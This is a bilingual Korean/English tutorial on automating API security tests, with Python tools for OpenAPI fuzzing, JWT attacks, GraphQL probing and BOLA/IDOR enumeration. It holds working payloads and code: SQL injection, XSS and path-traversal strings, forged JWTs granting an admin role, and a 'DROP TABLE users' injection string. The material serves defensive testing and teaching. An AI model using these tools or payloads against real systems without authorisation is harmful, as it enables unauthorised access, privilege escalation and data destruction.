> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# API 보안 테스트 자동화

## 0. 초보자를 위한 개념 이해

### API 보안 테스트란?

**API(Application Programming Interface)**는 소프트웨어 시스템들이 서로 통신하는 규약입니다. 모든 모바일 앱, 웹 서비스, 마이크로서비스는 API를 통해 데이터를 주고받습니다.

```
API 통신 예시:
  카카오뱅크 앱 → API 요청 → 서버
  GET /api/v1/accounts/123/balance
  Authorization: Bearer eyJhbGc...
  
  ← 응답
  {"balance": 1500000, "currency": "KRW"}
```

**API가 공격 대상이 되는 이유:**
```
전통적인 웹 공격:          API 공격:
  HTML 폼 → XSS              JSON 파라미터 → 인젝션
  URL → SQL 인젝션            JWT 토큰 → 조작
  쿠키 → 세션 하이재킹         API 키 → 무단 사용
```

### API 보안 테스트 자동화가 필요한 이유

```
수동 테스트의 한계:
  API 엔드포인트가 수십~수백 개
  각 엔드포인트마다 수백 가지 테스트
  → 사람이 일일이 테스트하면 수주 소요

자동화의 장점:
  1. OpenAPI 명세(swagger.json)만 있으면 자동으로 테스트 생성
  2. CI/CD에 통합 → 코드 변경 시마다 자동 실행
  3. 반복 가능 (같은 테스트 조건으로 재실행)
  4. 야간에도 실행 (사람 없어도 됨)
```

### OWASP API Security Top 10 (2023)

```
API1:2023  — Broken Object Level Authorization (BOLA)
  예: /api/orders/123 → /api/orders/124로 바꿔서 다른 사람 주문 조회

API2:2023  — Broken Authentication
  예: 약한 JWT 검증, 만료된 토큰 수락

API3:2023  — Broken Object Property Level Authorization
  예: 응답에 숨겨야 할 필드 포함 (내부 ID, 관리자 상태)

API4:2023  — Unrestricted Resource Consumption
  예: 속도 제한 없이 무한 요청 → 서버 과부하 또는 과금

API5:2023  — Broken Function Level Authorization
  예: 일반 사용자가 /admin/users API 호출 가능

API6:2023  — Unrestricted Access to Sensitive Business Flows
  예: 봇이 무한 쿠폰 발급, 티켓팅 사재기

API7:2023  — Server Side Request Forgery (SSRF)
  예: URL 파라미터에 내부 서비스 주소 삽입

API8:2023  — Security Misconfiguration
  예: CORS 와일드카드 (*), 불필요한 HTTP 메서드 허용

API9:2023  — Improper Inventory Management
  예: 구형 API 버전이 여전히 활성화 (/api/v1/... 숨어있음)

API10:2023 — Unsafe Consumption of APIs
  예: 외부 API 응답을 검증 없이 신뢰하고 처리
```

---

OpenAPI 명세 기반 자동 퍼징, OAuth/JWT 보안 테스트, GraphQL 취약점 자동화, 비즈니스 로직 취약점 테스트를 Python으로 구현한다.

---

## 1. OpenAPI 기반 자동 퍼징

### 1.1 Swagger/OpenAPI 파서 및 퍼저

```python
#!/usr/bin/env python3
"""OpenAPI 명세 기반 자동 API 보안 퍼저"""
import argparse
import itertools
import json
import random
import string
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

import requests
import yaml


@dataclass
class APIEndpoint:
    path: str
    method: str
    parameters: list[dict]
    request_body: dict | None
    auth_required: bool
    tags: list[str]


@dataclass
class FuzzResult:
    endpoint: str
    method: str
    payload: dict
    status_code: int
    response_time: float
    finding: str = ""


class OpenAPIFuzzer:
    def __init__(self, spec_path: str | Path, base_url: str, api_key: str = "") -> None:
        self.base_url = base_url.rstrip("/")
        self.api_key = api_key
        self.session = requests.Session()
        if api_key:
            self.session.headers["Authorization"] = f"Bearer {api_key}"

        spec_path = Path(spec_path)
        with spec_path.open() as f:
            if spec_path.suffix in (".yaml", ".yml"):
                self.spec = yaml.safe_load(f)
            else:
                self.spec = json.load(f)

        self.endpoints = self._parse_endpoints()

    def _parse_endpoints(self) -> list[APIEndpoint]:
        endpoints = []
        for path, methods in self.spec.get("paths", {}).items():
            for method, details in methods.items():
                if method not in ("get", "post", "put", "patch", "delete"):
                    continue

                auth_required = bool(details.get("security", self.spec.get("security")))
                endpoints.append(APIEndpoint(
                    path=path,
                    method=method.upper(),
                    parameters=details.get("parameters", []),
                    request_body=details.get("requestBody"),
                    auth_required=auth_required,
                    tags=details.get("tags", []),
                ))
        return endpoints

    def _generate_fuzz_values(self, schema: dict) -> list[Any]:
        data_type = schema.get("type", "string")
        values = []

        if data_type == "string":
            values = [
                "",                          # 빈 문자열
                "A" * 10000,                # 긴 문자열
                "' OR '1'='1",              # SQLi
                "<script>alert(1)</script>", # XSS
                "../../../etc/passwd",       # Path Traversal
                "${7*7}",                   # SSTI
                "%00",                      # Null Byte
                "{{7*7}}",                  # Template Injection
                "0",
                "-1",
                "null",
                "undefined",
            ]
        elif data_type == "integer":
            values = [
                0, -1, -2147483648, 2147483647,
                9999999999, -9999999999,
                "abc", "1.5", "", "null",
            ]
        elif data_type == "boolean":
            values = [True, False, "true", "false", "1", "0", "", "null"]
        elif data_type == "array":
            values = [[], ["A" * 1000] * 100, None, "not_an_array"]

        return values

    def fuzz_endpoint(self, endpoint: APIEndpoint) -> list[FuzzResult]:
        results = []
        url = self.base_url + endpoint.path

        # 경로 파라미터 치환
        if "{" in url:
            import re
            path_params = re.findall(r"\{(\w+)\}", url)
            for param in path_params:
                url = url.replace(f"{{{param}}}", "1")

        # 파라미터 퍼징
        for param in endpoint.parameters:
            schema = param.get("schema", {"type": "string"})
            fuzz_values = self._generate_fuzz_values(schema)

            for value in fuzz_values[:5]:  # 상위 5개만
                params = {param["name"]: value}
                try:
                    import time
                    start = time.time()
                    resp = self.session.request(
                        endpoint.method,
                        url,
                        params=params if endpoint.method == "GET" else None,
                        json=params if endpoint.method != "GET" else None,
                        timeout=10,
                        verify=False,
                    )
                    elapsed = time.time() - start

                    finding = self._analyze_response(resp, value)
                    if finding:
                        results.append(FuzzResult(
                            endpoint=endpoint.path,
                            method=endpoint.method,
                            payload={param["name"]: str(value)[:50]},
                            status_code=resp.status_code,
                            response_time=elapsed,
                            finding=finding,
                        ))

                except requests.RequestException:
                    pass

        return results

    def _analyze_response(self, resp: requests.Response, payload: Any) -> str:
        # 서버 오류는 잠재적 취약점
        if resp.status_code == 500:
            return f"Server error (500) — possible internal error exposure"

        body = resp.text.lower()

        # 오류 메시지에서 기술 스택 노출
        if any(kw in body for kw in ["traceback", "exception", "stack trace", "sql syntax", "ora-"]):
            return f"Stack trace/DB error exposure"

        # SQLi 징후
        if any(kw in body for kw in ["mysql", "postgresql", "sqlite", "syntax error near"]):
            return f"SQL error message exposure — possible SQLi"

        # 경로 탐색 성공
        if "root:" in resp.text or "daemon:" in resp.text:
            return f"Path traversal successful — /etc/passwd content included"

        # 응답 시간 기반 (10초 이상 = 시간 기반 인젝션)
        if resp.elapsed.total_seconds() > 8:
            return f"Response delay ({resp.elapsed.total_seconds():.1f}s) — possible time-based injection"

        return ""

    def run(self) -> list[FuzzResult]:
        all_results = []
        print(f"[*] Starting fuzzing of {len(self.endpoints)} endpoints")
        for endpoint in self.endpoints:
            results = self.fuzz_endpoint(endpoint)
            all_results.extend(results)
            if results:
                for r in results:
                    print(f"  [!] {r.method} {r.endpoint}: {r.finding}")
        return all_results


def main() -> None:
    parser = argparse.ArgumentParser(description="OpenAPI Auto Fuzzer")
    parser.add_argument("spec", help="OpenAPI spec file (JSON/YAML)")
    parser.add_argument("--base-url", required=True, help="API base URL")
    parser.add_argument("--api-key", default="", help="Authentication token")
    parser.add_argument("-o", "--output", help="Save results JSON")
    args = parser.parse_args()

    fuzzer = OpenAPIFuzzer(args.spec, args.base_url, args.api_key)
    results = fuzzer.run()

    print(f"\n[+] Found {len(results)} vulnerability candidates")
    if args.output:
        import json as json_mod
        Path(args.output).write_text(
            json_mod.dumps([vars(r) for r in results], indent=2, ensure_ascii=False)
        )


if __name__ == "__main__":
    main()
```

---

## 2. JWT 보안 테스트

### 2.1 JWT 취약점 자동 탐지

```python
#!/usr/bin/env python3
"""JWT 보안 취약점 자동 테스터"""
import argparse
import base64
import hashlib
import hmac
import json
import time
from typing import Optional


class JWTSecurityTester:
    def __init__(self, target_url: str, token: str) -> None:
        self.target_url = target_url
        self.original_token = token
        self.header, self.payload, self.signature = self._decode_parts(token)

    def _decode_parts(self, token: str) -> tuple[dict, dict, bytes]:
        parts = token.split(".")
        if len(parts) != 3:
            raise ValueError("유효하지 않은 JWT 형식")

        def decode(part: str) -> dict:
            padded = part + "=" * (4 - len(part) % 4)
            return json.loads(base64.urlsafe_b64decode(padded))

        sig = base64.urlsafe_b64decode(parts[2] + "=" * (4 - len(parts[2]) % 4))
        return decode(parts[0]), decode(parts[1]), sig

    def _encode_token(self, header: dict, payload: dict, signature: bytes = b"") -> str:
        def encode(d: dict) -> str:
            return base64.urlsafe_b64encode(json.dumps(d, separators=(",", ":")).encode()).rstrip(b"=").decode()

        h = encode(header)
        p = encode(payload)
        s = base64.urlsafe_b64encode(signature).rstrip(b"=").decode()
        return f"{h}.{p}.{s}"

    def test_algorithm_none(self) -> Optional[str]:
        """alg=none attack: bypass signature verification"""
        modified_header = {**self.header, "alg": "none"}
        modified_payload = {**self.payload, "role": "admin", "exp": int(time.time()) + 3600}
        token = self._encode_token(modified_header, modified_payload, b"")
        # Remove signature part entirely
        parts = token.split(".")
        return f"{parts[0]}.{parts[1]}."

    def test_hs256_with_rs256_pubkey(self, public_key: str) -> Optional[str]:
        """RS256 → HS256 algorithm confusion attack"""
        modified_header = {**self.header, "alg": "HS256"}
        modified_payload = {**self.payload, "role": "admin"}

        def encode(d: dict) -> str:
            return base64.urlsafe_b64encode(json.dumps(d, separators=(",", ":")).encode()).rstrip(b"=").decode()

        h = encode(modified_header)
        p = encode(modified_payload)
        message = f"{h}.{p}".encode()

        key = public_key.encode() if isinstance(public_key, str) else public_key
        sig = hmac.new(key, message, hashlib.sha256).digest()
        s = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
        return f"{h}.{p}.{s}"

    def test_weak_secret(self, wordlist: Optional[list[str]] = None) -> Optional[str]:
        """Weak secret brute force"""
        if wordlist is None:
            wordlist = [
                "secret", "password", "12345", "admin", "key",
                "jwt_secret", "mysecret", "changeme", "supersecret",
            ]

        header_b64 = self.original_token.split(".")[0]
        payload_b64 = self.original_token.split(".")[1]
        message = f"{header_b64}.{payload_b64}".encode()

        original_sig = self.signature

        for candidate in wordlist:
            sig = hmac.new(candidate.encode(), message, hashlib.sha256).digest()
            if sig == original_sig:
                return candidate

        return None

    def test_expiry_bypass(self) -> str:
        """Expiration time manipulation"""
        modified_payload = {**self.payload, "exp": 9999999999}
        return self._encode_token(self.header, modified_payload, self.signature)

    def test_kid_injection(self) -> str:
        """kid (Key ID) SQL/Path injection"""
        modified_header = {
            **self.header,
            "kid": "../../dev/null",  # Use empty file as empty key
        }
        sig = hmac.new(b"", f"{self.original_token.split('.')[0]}.{self.original_token.split('.')[1]}".encode(), hashlib.sha256).digest()
        return self._encode_token(modified_header, self.payload, sig)

    def run_all_tests(self) -> dict:
        results = {}

        print("[*] Testing alg=none attack...")
        results["alg_none"] = self.test_algorithm_none()

        print("[*] Brute forcing weak secret...")
        weak_key = self.test_weak_secret()
        results["weak_key"] = weak_key
        if weak_key:
            print(f"  [!!!] Weak key found: {weak_key}")

        print("[*] Generating kid injection payload...")
        results["kid_injection"] = self.test_kid_injection()

        return results


def main() -> None:
    parser = argparse.ArgumentParser(description="JWT Security Tester")
    parser.add_argument("token", help="JWT token to analyze")
    parser.add_argument("--target", help="Target URL for testing")
    parser.add_argument("--wordlist", help="Secret key wordlist file")
    args = parser.parse_args()

    wordlist = None
    if args.wordlist:
        wordlist = Path(args.wordlist).read_text().splitlines()

    tester = JWTSecurityTester(args.target or "http://localhost", args.token)

    print(f"[*] Header: {tester.header}")
    print(f"[*] Payload: {tester.payload}")

    results = tester.run_all_tests()
    for test_name, result in results.items():
        if result:
            print(f"[+] {test_name}: {str(result)[:100]}")


if __name__ == "__main__":
    main()
```

---

## 3. GraphQL 보안 테스트

```python
#!/usr/bin/env python3
"""GraphQL API 취약점 자동 탐지"""
import argparse
import json
from typing import Any

import requests


class GraphQLSecurityTester:
    INTROSPECTION_QUERY = """
    {
      __schema {
        types { name kind fields { name type { name kind } } }
        queryType { name }
        mutationType { name }
        subscriptionType { name }
      }
    }
    """

    def __init__(self, endpoint: str, headers: dict | None = None) -> None:
        self.endpoint = endpoint
        self.session = requests.Session()
        self.session.headers.update(headers or {})
        self.session.headers["Content-Type"] = "application/json"

    def query(self, gql_query: str, variables: dict = None) -> dict:
        payload = {"query": gql_query}
        if variables:
            payload["variables"] = variables
        resp = self.session.post(self.endpoint, json=payload, timeout=15, verify=False)
        resp.raise_for_status()
        return resp.json()

    def test_introspection(self) -> dict:
        try:
            result = self.query(self.INTROSPECTION_QUERY)
            schema = result.get("data", {}).get("__schema", {})
            if schema:
                types = [t["name"] for t in schema.get("types", []) if not t["name"].startswith("__")]
                return {
                    "enabled": True,
                    "types": types[:20],
                    "finding": "Introspection enabled — full schema exposure possible",
                }
        except Exception:
            pass
        return {"enabled": False}

    def test_batch_query(self, simple_query: str) -> dict:
        """Test rate limit bypass via batch queries"""
        batch = [{"query": simple_query}] * 100
        try:
            resp = self.session.post(self.endpoint, json=batch, timeout=30, verify=False)
            if isinstance(resp.json(), list) and len(resp.json()) == 100:
                return {"vulnerable": True, "finding": "Batch queries allowed — rate limit bypass possible"}
        except Exception:
            pass
        return {"vulnerable": False}

    def test_depth_limit(self) -> dict:
        """Unbounded depth query (potential DoS)"""
        deep_query = "{ " + "user { " * 20 + "id " + "} " * 20 + " }"
        try:
            result = self.query(deep_query)
            if "errors" not in result:
                return {"vulnerable": True, "finding": "No query depth limit — DoS possible"}
        except Exception:
            pass
        return {"vulnerable": False}

    def test_field_suggestion(self) -> dict:
        """Discover hidden fields via field suggestions"""
        result = self.query("{ user { pasword } }")  # Intentional typo
        errors = result.get("errors", [])
        for error in errors:
            message = error.get("message", "")
            if "Did you mean" in message:
                return {
                    "finding": f"Field suggestion feature active: {message}",
                    "suggested_fields": message,
                }
        return {}

    def test_sql_injection_via_graphql(self, type_name: str, field: str) -> list[str]:
        findings = []
        payloads = ["' OR '1'='1", "\" OR 1=1--", "1; DROP TABLE users--"]

        for payload in payloads:
            query = f'{{ {type_name}({field}: "{payload}") {{ id }} }}'
            try:
                result = self.query(query)
                body = json.dumps(result)
                if any(kw in body.lower() for kw in ["syntax error", "mysql", "postgresql", "sql"]):
                    findings.append(f"SQL error exposure: {payload}")
            except Exception:
                pass

        return findings

    def run_all_tests(self) -> dict:
        results = {}

        print("[*] Introspection test...")
        results["introspection"] = self.test_introspection()

        print("[*] Batch query test...")
        results["batch_query"] = self.test_batch_query("{ __typename }")

        print("[*] Depth limit test...")
        results["depth_limit"] = self.test_depth_limit()

        print("[*] Field suggestion test...")
        results["field_suggestion"] = self.test_field_suggestion()

        return results


def main() -> None:
    parser = argparse.ArgumentParser(description="GraphQL Security Tester")
    parser.add_argument("endpoint", help="GraphQL endpoint URL")
    parser.add_argument("--token", help="Authentication token")
    args = parser.parse_args()

    headers = {"Authorization": f"Bearer {args.token}"} if args.token else {}
    tester = GraphQLSecurityTester(args.endpoint, headers)
    results = tester.run_all_tests()

    for test, result in results.items():
        if result.get("enabled") or result.get("vulnerable") or result.get("finding"):
            print(f"[!] {test}: {result.get('finding', result)}")


if __name__ == "__main__":
    main()
```

---

## 4. BOLA/IDOR 자동 탐지

```python
#!/usr/bin/env python3
"""BOLA (Broken Object Level Authorization) 자동 탐지"""
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests


class BOLATester:
    def __init__(self, base_url: str, victim_token: str, attacker_token: str) -> None:
        self.base_url = base_url
        self.victim_session = requests.Session()
        self.victim_session.headers["Authorization"] = f"Bearer {victim_token}"
        self.attacker_session = requests.Session()
        self.attacker_session.headers["Authorization"] = f"Bearer {attacker_token}"

    def test_idor(self, path_template: str, id_range: range) -> list[dict]:
        findings = []

        def check_id(object_id: int) -> dict | None:
            url = self.base_url + path_template.format(id=object_id)
            victim_resp = self.victim_session.get(url, timeout=5, verify=False)

            if victim_resp.status_code != 200:
                return None

            attacker_resp = self.attacker_session.get(url, timeout=5, verify=False)

            if attacker_resp.status_code == 200:
                return {
                    "id": object_id,
                    "url": url,
                    "finding": f"BOLA vulnerability: attacker successfully accessed ID {object_id}",
                    "victim_response_len": len(victim_resp.text),
                    "attacker_response_len": len(attacker_resp.text),
                }
            return None

        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(check_id, i): i for i in id_range}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    findings.append(result)
                    print(f"[!!!] BOLA: {result['url']}")

        return findings


def main() -> None:
    parser = argparse.ArgumentParser(description="BOLA/IDOR Tester")
    parser.add_argument("base_url")
    parser.add_argument("path_template", help="e.g.: /api/users/{id}/profile")
    parser.add_argument("--victim-token", required=True)
    parser.add_argument("--attacker-token", required=True)
    parser.add_argument("--id-start", type=int, default=1)
    parser.add_argument("--id-end", type=int, default=100)
    args = parser.parse_args()

    tester = BOLATester(args.base_url, args.victim_token, args.attacker_token)
    findings = tester.test_idor(args.path_template, range(args.id_start, args.id_end + 1))
    print(f"\n[+] BOLA vulnerabilities: {len(findings)} found")


if __name__ == "__main__":
    main()
```

---

<a name="english"></a>

# API Security Testing Automation

This document implements OpenAPI spec-based auto-fuzzing, OAuth/JWT security testing, GraphQL vulnerability automation, and business logic vulnerability testing in Python.

---

## 1. OpenAPI-based Auto Fuzzing

### 1.1 Swagger/OpenAPI Parser and Fuzzer

The `OpenAPIFuzzer` class parses an OpenAPI specification file (JSON or YAML), enumerates all endpoints, and fuzzes each parameter with a set of dangerous payloads including SQL injection strings, XSS payloads, path traversal strings, template injection markers, and boundary values.

**Key components:**
- `_parse_endpoints()` — extracts all path/method combinations from the spec
- `_generate_fuzz_values(schema)` — generates type-appropriate fuzz values per parameter type (string, integer, boolean, array)
- `fuzz_endpoint(endpoint)` — sends fuzz payloads and records findings
- `_analyze_response(resp, payload)` — classifies responses: HTTP 500 errors, stack traces, SQL error messages, path traversal success indicators, and time-based injection delays

**Usage:**
```bash
python3 api_fuzzer.py openapi.yaml --base-url https://api.example.com --api-key TOKEN -o results.json
```

---

## 2. JWT Security Testing

### 2.1 Automated JWT Vulnerability Detection

The `JWTSecurityTester` class implements multiple JWT attack techniques:

| Attack | Method | Description |
|--------|--------|-------------|
| **alg=none** | `test_algorithm_none()` | Sets algorithm to "none" and removes signature to bypass verification |
| **Algorithm Confusion** | `test_hs256_with_rs256_pubkey()` | RS256 → HS256 confusion: signs with RSA public key as HMAC secret |
| **Weak Secret Brute Force** | `test_weak_secret()` | Tests common secrets against the original signature |
| **Expiry Bypass** | `test_expiry_bypass()` | Sets exp to year 2286 (9999999999) |
| **kid Injection** | `test_kid_injection()` | Injects path traversal into the kid header field |

**Usage:**
```bash
python3 jwt_tester.py <TOKEN> --target https://api.example.com --wordlist secrets.txt
```

---

## 3. GraphQL Security Testing

The `GraphQLSecurityTester` class tests four common GraphQL vulnerabilities:

| Test | Finding | Risk |
|------|---------|------|
| **Introspection** | Full schema exposed | Medium — attackers can enumerate all types, fields, and mutations |
| **Batch Queries** | Rate limiting bypassed | Medium — 100 parallel queries sent in a single request |
| **Depth Limit** | No query depth restriction | High — deeply nested queries can cause DoS |
| **Field Suggestion** | Hidden fields discoverable | Low — typo-based error messages leak field names |

Additional SQL injection testing through GraphQL arguments is also implemented via `test_sql_injection_via_graphql()`.

**Usage:**
```bash
python3 graphql_tester.py https://api.example.com/graphql --token TOKEN
```

---

## 4. BOLA/IDOR Automated Detection

The `BOLATester` class implements a two-token BOLA (Broken Object Level Authorization) test:

1. The **victim session** requests a resource by ID — if it returns HTTP 200, the resource exists
2. The **attacker session** requests the same resource — if it also returns HTTP 200, BOLA is confirmed

The test runs in parallel with a thread pool (default 10 workers) across a configurable ID range.

**Usage:**
```bash
python3 bola_tester.py https://api.example.com /api/users/{id}/profile \
    --victim-token VICTIM_JWT --attacker-token ATTACKER_JWT \
    --id-start 1 --id-end 500
```

**Finding format:**
```json
{
  "id": 42,
  "url": "https://api.example.com/api/users/42/profile",
  "finding": "BOLA vulnerability: attacker successfully accessed ID 42",
  "victim_response_len": 312,
  "attacker_response_len": 312
}
```
